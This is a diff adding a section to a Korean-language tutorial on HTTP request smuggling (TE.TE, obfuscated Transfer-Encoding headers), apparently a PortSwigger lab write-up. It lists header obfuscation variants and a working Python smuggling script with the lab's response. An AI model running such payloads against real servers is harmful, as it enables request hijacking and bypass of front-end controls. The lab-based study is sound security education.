@@ -280,8 +280,111 @@ Content-Length: 27
 "Unrecognized method GPOST"
 ```
 
+#### TE.TE behavior: obfuscating the TE header
+
+이 경우는 Front-end와 Back-end 모두 `Transfer-Encoding` 헤더를 지원하지만, 서버 하나는 헤더의 조작을 통해 헤더를 인식하지 못하게 할 수 있는 경우 입니다.
+
+`Transfer-Encoding` 헤더를 조작하는 방법은 끝이 없습니다. 예시는 다음과 같습니다.
+
+```
+Transfer-Encoding: xchunked
+
+Transfer-Encoding : xchunked
+
+Transfer-Encoding: chunked
+Transfer-Encoding: x
+
+Transfer-Encoding: [tab]chunked
+[space]Transfer-Encoding: chunked
+
+X: X[\n]Transfer-Encoding: chunked
+
+Transfer-Encoding: 
+chunked
+```
+
+리얼 월드에서는 프로토콜을 사용할 때 명세에서 시키는대로 정확히 사용하지 않습니다. 때문에 약간씩 다른식으로 동작하는 것은 자주 있는 일입니다. **TE.TE 취약점**을 발견하기 위해서는, `Transfer-Encoding` 헤더를 변형시켜가면서 어떤 경우에 Front-end와 Back-end가 다르게 동작하는지 알아내야 합니다. 
+
+`Transfer-Encoding` 헤더를 처리하지 못하는 쪽이 Front-end인지, Back-end 쪽인지에 따라 공격 방식이 각각 **CL.TE** , **TE.CL**와 비슷해집니다.
+
+예제를 풀어봅시다.
+
+**LAB: HTTP request smuggling, obfuscating the TE header**
+
+**LAB Description :**
+
+이 문제는 Front-end와 Back-end 서버로 이루어져 있고 Back-end 서버는 chunked encoding을 지원하지 않습니다. Front-end 서버는 `GET`, `POST` 메소드 외에 다른 메소드를 이용한 요청은 거부합니다.
+
+이 Lab을 풀려면, HTTP request smuggling 공격을 이용해서 다음 요청이 `GPOST` 메소드를 사용하게 해야 합니다.
+
+**PAYLOAD: **
+
+``` python
+import socket
+import requests
+import ssl
+
+HOST = "ac3e1f471eb92269807ae90a007a0066.web-security-academy.net"
+PORT = 443
+
+def send_payload(data):
+    context=ssl.create_default_context()
+    sock=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
+    ssl_sock=context.wrap_socket(sock,server_hostname=HOST)
+    ssl_sock.connect((HOST,PORT))
+    ssl_sock.send(data)
+    data = ssl_sock.recv(1024)
+    ssl_sock.close()
+
+    return data
+
+second_request  = b'GPOST / HTTP/1.1\r\n'
+second_request += b'Content-Type: application/x-www-form-urlencoded\r\n'
+second_request += b'Content-Length: 10\r\n'
+second_request += b'\r\n'
+second_request += b'x=1'
+
+first_request  = b'POST / HTTP/1.1\r\n'
+first_request += b'Host: '+HOST.encode()+b'\r\n'
+first_request += b'Content-Length: 4\r\n'
+first_request += b'Content-Type: application/x-www-form-urlencoded\r\n'
+first_request += b'Transfer-Encoding: chunked\r\n'
+first_request += b'Transfer-Encoding: x\r\n'
+first_request += b'\r\n'
+first_request += hex(len(second_request))[2:].encode()+b'\r\n'
+first_request += second_request
+first_request += b'\r\n'
+first_request += b'0\r\n\r\n'
+
+
+smuggle_request = first_request
+
+data = send_payload(smuggle_request)
+
+print (f'{"[*] REQUEST":^10}')
+print (smuggle_request.decode())
+print ("{:^10}".format("[*] RESPONSE"))
+print (data.decode())
+```
+
+공격 방법은 위의 예제와 동일하지만, 이 취약점을 발견하는 데 좀 더 시간이 걸립니다. `Transfer-Encoding`를 조작해보고, **CL.TE**인지, **TE.CL**인지도 확인해봐야 합니다.
+
+**Response :**
+
+```http
+HTTP/1.1 403 Forbidden
+Content-Type: application/json; charset=utf-8
+Connection: close
+Keep-Alive: timeout=0
+Content-Length: 27
+
+"Unrecognized method GPOST"
+```
 
 
 
+**HTTP request smuggling** 공격에 대해 알아보고 기본적인 공격방벙을 공부했는데, 좀 더 많은 문제를 풀어보고 싶으시면 링크 남겨드릴테니 풀어보시면 될 것 같습니다. **HTTP request smuggling** 공격에 대한 문제가 많지 않았던 거 같은데 여기서 공부하면 좋을 것 같습니다 :
 
-#### TODO: TE.TE behavior: obfuscating the TE header
+> 🚀 [https://portswigger.net/web-security/request-smuggling/exploiting](https://portswigger.net/web-security/request-smuggling/exploiting)
+
+ 
